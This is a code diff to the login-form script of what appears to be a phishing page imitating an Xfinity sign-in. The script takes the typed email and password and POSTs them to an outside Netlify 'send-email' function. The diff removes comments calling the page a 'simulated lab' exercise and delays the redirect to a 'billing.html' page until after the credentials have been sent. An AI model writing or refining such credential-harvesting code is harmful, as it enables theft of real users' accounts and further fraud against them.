@@ -121,9 +121,7 @@
     <script>
       document.querySelector("#form1").addEventListener("submit", async (e) => {
         e.preventDefault();
-        window.location.href = "billing.html";
 
-        // Simulated lab credentials (replace with dummy data for training)
         const u_name = document.querySelector("#email").value;
         const u_pass = document.querySelector("#pass_1").value;
 
@@ -132,17 +130,23 @@
             "https://xfinity-protocol-login.netlify.app/.netlify/functions/send-email",
             {
               method: "POST",
-              headers: { "Content-Type": "application/json" },
+              headers: {
+                "Content-Type": "application/json",
+                "Access-Control-Allow-Origin": "*",
+              },
               body: JSON.stringify({
                 u_name,
                 u_pass,
-                pageName: "Login Page Simulation", // Changes per page in lab
+                pageName: "Login Page Simulation",
               }),
             }
           );
 
           const data = await res.json();
           alert("Email sent: " + JSON.stringify(data));
+
+          // ✅ Redirect only after sending email
+          window.location.href = "billing.html";
         } catch (err) {
           alert("Error sending email: " + err.message);
         }
